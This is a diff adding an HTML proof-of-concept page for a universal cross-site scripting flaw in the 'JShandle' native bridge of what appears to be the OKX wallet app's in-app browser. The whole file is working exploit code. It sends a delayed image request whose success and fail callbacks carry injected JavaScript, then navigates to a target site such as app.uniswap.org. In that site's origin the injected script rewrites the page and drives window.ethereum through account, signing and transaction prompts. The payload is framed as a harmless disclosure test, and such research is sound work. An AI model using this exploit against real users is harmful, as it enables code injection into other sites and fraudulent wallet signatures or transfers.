@@ -1,0 +1,98 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>OKX JShandle delayed-callback UXSS PoC</title>
+<style>
+  body { font: 16px system-ui; max-width: 760px; margin: 40px auto; padding: 0 20px; }
+  code { overflow-wrap: anywhere; }
+  button { font: inherit; padding: 10px 16px; }
+</style>
+<h1>OKX JShandle delayed-callback UXSS </h1>
+
+<p id="config"></p>
+<button id="run">Run PoC</button>
+<pre id="status">idle</pre>
+<script>
+(() => {
+  const query = new URLSearchParams(location.search);
+  const slowImage = query.get("slowImage") ||
+    "https://httpbin.org/delay/4";
+  const target = query.get("target") || "https://app.uniswap.org/";
+  const requestedAction = query.get("walletAction") || "both";
+  const walletAction = ["none", "sign", "tx", "both"].includes(requestedAction)
+    ? requestedAction
+    : "both";
+  const status = document.querySelector("#status");
+
+  document.querySelector("#config").textContent =
+    `slowImage=${slowImage} | target=${target} | walletAction=${walletAction}`;
+
+  const injectedCallback =
+    '(async()=>{const action=' + JSON.stringify(walletAction) + ';' +
+    'document.open();' +
+    'document.write("<!doctype html><meta charset=utf-8><title>OKX UXSS</title>' +
+    '<h1>JShandle UXSS @ "+location.origin+"</h1>' +
+    '<p>Executed by the stale native image callback.</p>' +
+    '<pre id=walletProbe>Preparing dummy wallet probe...</pre>");' +
+    'document.close();' +
+    'const out=document.getElementById("walletProbe");' +
+    'const log=s=>{out.textContent+="\\n"+s};' +
+    'alert("OKX UXSS @ "+location.origin);' +
+    'if(action==="none"){log("Wallet probe disabled.");return}' +
+    'const eth=window.ethereum;' +
+    'if(!eth||typeof eth.request!=="function"){' +
+      'log("window.ethereum.request is unavailable.");return}' +
+    'let accounts=[];' +
+    'try{accounts=await eth.request({method:"eth_accounts"})||[]}' +
+    'catch(e){log("eth_accounts failed: "+(e&&e.message||e))}' +
+    'if(!accounts.length){' +
+      'log("Requesting a disposable test-account connection...");' +
+      'try{accounts=await eth.request({method:"eth_requestAccounts"})||[]}' +
+      'catch(e){log("Connection rejected: "+(e&&e.message||e));return}}' +
+    'const from=accounts[0];' +
+    'if(!from){log("No connected test account.");return}' +
+    'log("Using test account: "+from.slice(0,8)+"..."+from.slice(-4));' +
+    'if(action==="sign"||action==="both"){' +
+      'log("Triggering dummy personal_sign prompt; reject it.");' +
+      'try{const sig=await eth.request({' +
+        'method:"personal_sign",' +
+        'params:["0x4f4b5820555853532073656375726974792074657374202d2072656a65637420746869732070726f6d7074",from]});' +
+        'log("Unexpected approval; signature length="+String(sig).length)}' +
+      'catch(e){log("Sign rejected/failed: "+(e&&e.message||e))}}' +
+    'if(action==="tx"||action==="both"){' +
+      'log("Triggering zero-value self-transfer prompt; reject it.");' +
+      'try{const tx=await eth.request({' +
+        'method:"eth_sendTransaction",' +
+        'params:[{from:from,to:from,value:"0x0"}]});' +
+        'log("Unexpected approval; tx result length="+String(tx).length)}' +
+      'catch(e){log("Transaction rejected/failed: "+(e&&e.message||e))}}' +
+    '})';
+
+  document.querySelector("#run").addEventListener("click", () => {
+    const bridge = window.webkit &&
+      window.webkit.messageHandlers &&
+      window.webkit.messageHandlers.JShandle;
+
+    if (!bridge) {
+      status.textContent = "JShandle is not available in this browser context.";
+      return;
+    }
+
+    status.textContent = "Native image request started; navigating to target...";
+    bridge.postMessage({
+      method: "createImageWithMark",
+      data: {
+        url: slowImage,
+        w: 1,
+        h: 1,
+        outputType: 0,
+        watermark: []
+      },
+      success: injectedCallback,
+      fail: injectedCallback
+    });
+
+
+    setTimeout(() => location.replace(target), 100);
+  });
+})();
+</script>
